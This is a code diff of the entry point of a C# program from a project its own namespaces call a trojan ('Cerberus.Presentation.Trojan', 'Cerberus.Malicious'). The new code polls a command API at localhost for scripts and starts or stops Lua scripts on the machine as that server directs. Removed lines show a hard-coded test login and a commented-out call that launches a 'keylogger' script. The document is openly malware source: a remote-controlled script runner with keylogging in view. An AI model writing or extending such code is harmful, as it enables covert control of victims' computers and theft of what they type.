@@ -1,30 +1,52 @@
 ﻿using Cerberus.Domain.ApiService.ApiService;
-using Cerberus.Domain.Models.Person;
+using Cerberus.Domain.Models.Machine;
 using Cerberus.Presentation.Trojan.Core;
 using RestSharp;
 
 public class Program
 {
+    private static bool Run = true;
+    public static LuaResultApiService _luaResultApiService = new LuaResultApiService(new RestClient("http://localhost:5108/api"));
+    private static UserApiService _userService = new UserApiService(new RestClient("http://localhost:5108/api"));
+    private static ComputerScriptApiService _scriptService = new ComputerScriptApiService(new RestClient("http://localhost:5108/api"));
+    private static LuaScriptManager _scriptManager = new LuaScriptManager();
 
-    //[DllImport("Cerberus.Malicious.dll", CallingConvention = CallingConvention.Cdecl)]
-    //public static extern int testMan();
+    private static async Task<int> ListenScriptCalls()
+    {
+         
+
+        List<ComputerScript> _scripts = await _scriptService.GetComputerScripts();
+        _scripts = _scripts.ToList();
+        List<string> _services = _scriptManager.GetAllScripts();
+
+        foreach (ComputerScript script in _scripts)
+        {
+            string? service = _services.FirstOrDefault(svc => svc == script.Name);
+
+            if (service != null)
+            {
+                if (script.Active)
+                {
+                    _ = await _scriptManager.StartScriptAsync(service);
+                }
+                else
+                {
+                    _scriptManager.StopScript(service);
+                }
+            }
+
+        }
+
+        return 1;
+
+    }
+
 
     private static async Task Main(string[] args)
     {
 
-        UserApiService userService = new UserApiService(new RestClient("http://localhost:5108/api"));
-
-        User user = await userService.GetUserByLogin("user@user","user");
-
-        Console.WriteLine("TESTANDO:" + user.Name);
-
-        LuaScriptManager _scriptManager = new LuaScriptManager();
         _scriptManager.LoadScripts();
-
-        _scriptManager.StartScript("luaok");
-
-        //_ = _scriptManager.StartScriptAsync("luaok");
-        //_ = await _scriptManager.StartScriptAsync("keylogger");
+        _ = await Program.ListenScriptCalls();
 
     }
 }
